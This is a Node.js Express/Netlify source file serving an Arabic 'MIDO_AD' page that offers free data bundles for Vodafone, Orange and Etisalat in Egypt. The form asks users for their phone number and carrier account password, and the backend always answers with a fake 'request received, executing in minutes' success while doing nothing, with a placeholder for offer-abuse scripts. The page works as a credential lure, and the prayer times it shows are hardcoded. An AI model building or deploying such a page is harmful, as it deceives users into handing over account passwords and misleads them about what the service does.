const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const serverless = require('serverless-http');
const app = express();

app.use(bodyParser.json());

// الإعدادات والصور (MIDO_AD)
const BG_URL = "https://i.postimg.cc/zvQsfRp6/0b2e491cf363fb13fe72f199a1c0cde1.jpg";
const VODAFONE_ICON = "https://i.postimg.cc/SR7ZjRH4/Screenshot-20260213-154727-Google.jpg";
const ORANGE_ICON = "https://i.postimg.cc/MTT2tnyL/IMG-20260219-104918-030.jpg";
const ETISALAT_ICON = "https://i.postimg.cc/63Mrnrkh/Screenshot-20260328-235637-Google.jpg";

// واجهة الموقع (HTML)
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MIDO_AD | لوحة التحكم</title>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&family=Orbitron:wght@700;900&display=swap');
        :root { --blue: #008cff; --red: #ff003c; --black: #050505; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Cairo', sans-serif; background: var(--black) url('${BG_URL}') no-repeat center center fixed;
            background-size: cover; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-x: hidden;
        }
        .container { width: 95%; max-width: 480px; text-align: center; backdrop-filter: blur(10px); padding: 20px; }
        h1 { font-family: 'Orbitron', sans-serif; font-size: 3rem; margin-bottom: 30px; text-shadow: 0 0 15px var(--blue); }
        .view { display: none; animation: slideIn 0.3s ease-out; }
        .view.active { display: block; }
        @keyframes slideIn { from { opacity:0; transform: scale(0.9); } to { opacity:1; transform: scale(1); } }
        .btn-neon {
            width: 100%; padding: 20px; margin-bottom: 15px; background: rgba(0,0,0,0.7);
            border: none; border-right: 5px solid var(--blue); color: white;
            font-size: 1.2rem; font-weight: 900; cursor: pointer; display: flex; align-items: center;
            justify-content: space-between; border-radius: 5px 30px 30px 5px; transition: 0.3s;
        }
        .btn-neon:active { transform: translateY(5px); box-shadow: 0 0 20px var(--blue); }
        .btn-neon i.fa-bolt { color: #ffe600; }
        .btn-neon img { width: 45px; height: 45px; border-radius: 50%; border: 1px solid #fff; }
        .offer-card { width: 100%; padding: 15px; margin-bottom: 10px; background: rgba(255,255,255,0.05); border: 1px solid var(--red); color: white; border-radius: 12px; cursor: pointer; font-weight: bold; }
        input { width: 100%; padding: 15px; margin-bottom: 10px; background: #000; border: 1px solid #333; color: white; border-radius: 10px; text-align: center; }
        footer { margin-top: 30px; font-size: 0.7rem; opacity: 0.5; }
        #bot-icon { position: fixed; bottom: 20px; left: 20px; width: 60px; height: 60px; background: var(--blue); border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; box-shadow: 0 0 15px var(--blue); }
    </style>
</head>
<body>
<div class="container">
    <h1>MIDO_AD</h1>
    <div id="home" class="view active">
        <button class="btn-neon" onclick="showV('voda')"><span><i class="fas fa-bolt"></i> فودافون</span><img src="${VODAFONE_ICON}"></button>
        <button class="btn-neon" onclick="showV('orange')" style="border-right-color:#ff6600;"><span><i class="fas fa-bolt"></i> أورانج</span><img src="${ORANGE_ICON}"></button>
        <button class="btn-neon" onclick="showV('etisalat')" style="border-right-color:#719c30;"><span><i class="fas fa-bolt"></i> اتصالات</span><img src="${ETISALAT_ICON}"></button>
        <button class="btn-neon" onclick="getPrayers()" style="border-right-color:#fff;"><span>📅 مواقيت الصلاة</span><i class="fas fa-clock"></i></button>
    </div>

    <div id="voda" class="view">
        <button class="offer-card" onclick="openF('voda500')">500 ميجا فودافون</button>
        <button class="offer-card" onclick="openF('vodaFlex')">استعلام فلكسات</button>
        <button onclick="showV('home')" style="color:red; background:none; border:none; cursor:pointer;">رجوع</button>
    </div>

    <div id="orange" class="view">
        <button class="offer-card" onclick="openF('orangeFaw')">حل الفوازير (250M)</button>
        <button class="offer-card" onclick="openF('orange500')">500 ميجا أورانج</button>
        <button onclick="showV('home')" style="color:red; background:none; border:none; cursor:pointer;">رجوع</button>
    </div>

    <div id="etisalat" class="view">
        <button class="offer-card" onclick="openF('etiSoc')">500M سوشيال</button>
        <button class="offer-card" onclick="openF('etiStr')">500M استريمينج</button>
        <button onclick="showV('home')" style="color:red; background:none; border:none; cursor:pointer;">رجوع</button>
    </div>

    <div id="f-box" class="view">
        <input type="tel" id="ph" placeholder="الرقم">
        <input type="password" id="ps" placeholder="الباسورد">
        <button class="offer-card" style="background:var(--blue); border:none;" onclick="send()">تفعيل ⚡</button>
        <button onclick="showV('home')" style="color:gray; background:none; border:none; cursor:pointer;">إلغاء</button>
    </div>
    <footer>تطوير @AMI_EG - حقوق MIDO_AD 2026</footer>
</div>

<div id="bot-icon" onclick="startChat()"><i class="fas fa-robot"></i></div>

<script>
    let task = '';
    function showV(id){ document.querySelectorAll('.view').forEach(v=>v.classList.remove('active')); document.getElementById(id).classList.add('active'); }
    function openF(t){ task=t; showV('f-box'); }
    async function send(){
        Swal.fire({title:'جاري المعالجة...', didOpen:()=>Swal.showLoading()});
        const r = await fetch('/.netlify/functions/app/api', {
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({task, phone:document.getElementById('ph').value, pass:document.getElementById('ps').value})
        });
        const res = await r.json();
        Swal.fire(res.success?'نجاح':'خطأ', res.msg, res.success?'success':'error');
    }
    function getPrayers(){ Swal.fire('مواقيت الصلاة', 'الفجر: 4:20 | الظهر: 12:05 | العصر: 3:40 | المغرب: 6:15 | العشاء: 7:40', 'info'); }
    function startChat(){ Swal.fire({title:'MIDO AI', text:'أهلاً بك! جرب تفعيل العروض من القائمة الرئيسية.', background:'#000', color:'#008cff'}); }
</script>
</body>
</html>
    `);
});

// التعامل مع الطلبات (Backend)
app.post('/api', async (req, res) => {
    const { task, phone, pass } = req.body;
    // هنا تحط منطق السكريبتات اللي حولناها المرة اللي فاتت
    res.json({ success: true, msg: "تم استلام طلبك لـ " + task + " وجاري التنفيذ خلال دقائق!" });
});

// تصدير للـ Netlify
const handler = serverless(app);
module.exports.handler = async (event, context) => {
    return await handler(event, context);
};
